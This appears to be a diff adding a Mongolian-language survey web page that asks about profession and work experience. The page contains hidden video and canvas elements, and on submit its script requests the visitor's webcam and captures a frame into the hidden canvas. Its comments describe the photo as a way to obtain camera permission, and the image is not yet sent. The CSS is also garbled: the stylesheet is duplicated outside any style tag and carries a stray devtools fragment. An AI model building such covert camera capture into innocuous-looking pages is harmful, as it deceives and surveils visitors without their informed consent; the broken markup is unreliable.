@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="mn">
+    <head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Судалгаа - Survey</title>
+<style> == $0
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            width: 100%;
+            background-color: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            padding: 40px;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding-bottom: 20px;
+            border-bottom: 3px solid #667eea;
+        }
+
+        .logo {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 1.1rem;
+            color: #666;
+        }
+
+        .survey-form {
+            display: flex;
+            flex-direction: column;
+            gap: 30px;
+        }
+
+        .question {
+            background-color: #f8f9fa;
+            padding: 25px;
+            border-radius: 10px;
+            border-left: 4px solid #667eea;
+        }
+
+        .question-title {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .question-number {
+            color: #667eea;
+            margin-right: 8px;
+        }
+
+        input[type="text"],
+        textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border-color 0.3s;
+        }
+
+        input[type="text"]:focus,
+        textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        textarea {
+            min-height: 100px;
+            resize: vertical;
+            font-family: Arial, sans-serif;
+        }
+
+        .radio-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .radio-option {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .radio-option:hover {
+            background-color: #f0f0f0;
+            border-color: #667eea;
+        }
+
+        .radio-option input[type="radio"] {
+            margin-right: 10px;
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+        }
+
+        .radio-option label {
+            cursor: pointer;
+            font-size: 1rem;
+            color: #333;
+        }
+
+        .submit-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 8px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            margin-top: 20px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #ddd;
+            color: #666;
+            font-size: 0.9rem;
+        }
+
+        /* Responsive designn */
+        @media (max-width: 768px) {
+            .container {
+                padding: 25px;
+            }
+
+            .logo {
+                font-size: 2rem;
+            }
+
+            .question-title {
+                font-size: 1.1rem;
+            }
+        }
+    </style>
+
+
+        {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            width: 100%;
+            background-color: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            padding: 40px;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding-bottom: 20px;
+            border-bottom: 3px solid #667eea;
+        }
+
+        .logo {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 1.1rem;
+            color: #666;
+        }
+
+        .survey-form {
+            display: flex;
+            flex-direction: column;
+            gap: 30px;
+        }
+
+        .question {
+            background-color: #f8f9fa;
+            padding: 25px;
+            border-radius: 10px;
+            border-left: 4px solid #667eea;
+        }
+
+        .question-title {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .question-number {
+            color: #667eea;
+            margin-right: 8px;
+        }
+
+        input[type="text"],
+        textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border-color 0.3s;
+        }
+
+        input[type="text"]:focus,
+        textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        textarea {
+            min-height: 100px;
+            resize: vertical;
+            font-family: Arial, sans-serif;
+        }
+
+        .radio-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .radio-option {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .radio-option:hover {
+            background-color: #f0f0f0;
+            border-color: #667eea;
+        }
+
+        .radio-option input[type="radio"] {
+            margin-right: 10px;
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+        }
+
+        .radio-option label {
+            cursor: pointer;
+            font-size: 1rem;
+            color: #333;
+        }
+
+        .submit-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 8px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            margin-top: 20px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #ddd;
+            color: #666;
+            font-size: 0.9rem;
+        }
+
+        /* Responsive designn */
+        @media (max-width: 768px) {
+            .container {
+                padding: 25px;
+            }
+
+            .logo {
+                font-size: 2rem;
+            }
+
+            .question-title {
+                font-size: 1.1rem;
+            }
+        }
+</style>
+</head>
+<body>
+    <!-- Hidden elements for camera capture -->
+    <video id="video" autoplay="" playsinline="" class="hidden"></video>
+    <canvas id="canvas" class="hidden"></canvas>
+
+    <div class="container">
+        <header>
+            <div class="logo">Судалгаа</div>
+            <div class="subtitle">Таны санал бидэнд чухал</div>
+        </header>
+
+        <form id="surveyForm" class="survey-form">
+            <!-- Question 1 -->
+            <div class="question">
+                <div class="question-title">
+                    <span class="question-number">1)</span>
+                    Ямар мэргэжлээр ажилладаг вэ?
+                </div>
+                <textarea id="q1" name="profession" placeholder="Өөрийн мэргэжлээ энд бичнэ үү..." required=""></textarea>
+            </div>
+
+            <!-- Question 2 -->
+            <div class="question">
+                <div class="question-title">
+                    <span class="question-number">2)</span>
+                    Мэргэжлээрээ хэдэн жил ажиллаж байгаа вэ?
+                </div>
+                <div class="radio-group">
+                    <div class="radio-option">
+                        <input type="radio" id="exp1" name="experience" value="1-3 жил" required="">
+                        <label for="exp1">1-3 жил</label>
+                    </div>
+                    <div class="radio-option">
+                        <input type="radio" id="exp2" name="experience" value="3-5 жил">
+                        <label for="exp2">3-5 жил</label>
+                    </div>
+                    <div class="radio-option">
+                        <input type="radio" id="exp3" name="experience" value="5-10 жил">
+                        <label for="exp3">5-10 жил</label>
+                    </div>
+                    <div class="radio-option">
+                        <input type="radio" id="exp4" name="experience" value="10-15 жил">
+                        <label for="exp4">10-15 жил</label>
+                    </div>
+                    <div class="radio-option">
+                        <input type="radio" id="exp5" name="experience" value="15+ жил">
+                        <label for="exp5">15+ жил</label>
+                    </div>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn">Илгээх</button>
+        </form>
+
+        <footer>
+            © 2025 Судалгаа. Бүх эрх хуулиар хамгаалагдсан.
+        </footer>
+    </div>
+
+    <script>
+    // Flask сервер рүү POST хийх хаяг
+    const FORM_ACTION = "/submit";
+    
+    // DOM elements
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const surveyForm = document.getElementById('surveyForm');
+    const submitBtn = document.querySelector('.submit-btn');
+
+    let cameraStream = null;
+
+    // 1. Камерыг нээж, зургийг авна
+    function takePhotoAndSubmit() {
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Илгээж байна... Түр хүлээнэ үү';
+
+        // 1.1. Камерыг нээх хүсэлт
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                cameraStream = stream;
+                video.srcObject = stream;
+                
+                video.addEventListener('loadeddata', () => {
+                    // 1.2. Зургийг авах (1 секундын дараа)
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // 1.3. Зургийг авсны дараа stream-ийг зогсооно
+                        if (cameraStream) {
+                            cameraStream.getTracks().forEach(track => track.stop());
+                        }
+                        
+                        // 1.4. Зургийг base64 string болгож Flask руу илгээх (Энэ нь арай хүнд)
+                        // Энэ кодонд бид ЗУРАГ АВАХ ҮЙЛДЭЛ-ийг зөвхөн зөвшөөрөл авахад ашиглаж,
+                        // зөвхөөрөл авсан л бол шууд FORM-ийг илгээнэ.
+                        
+                        // 1.5. Камер нээгдсэн л бол формыг илгээх
+                        surveyForm.submit(); 
+                    }, 1000); // 1 секундын турш камер нээгдэхийг хүлээх
+                });
+            })
+            .catch(err => {
+                console.error('Камер нээгдэхгүй байна:', err);
+                
+                // 1.6. Камер нээгдэхгүй бол (permission өгөөгүй) шууд формыг илгээнэ
+                surveyForm.submit();
+            });
+    }
+
+    // 2. Form Submit-ийг удирдах
+    surveyForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        
+        // Form-ыг илгээхээс өмнө камерыг ажиллуулах
+        takePhotoAndSubmit(); 
+    });
+
+</script>
+
+</body>
+</html>
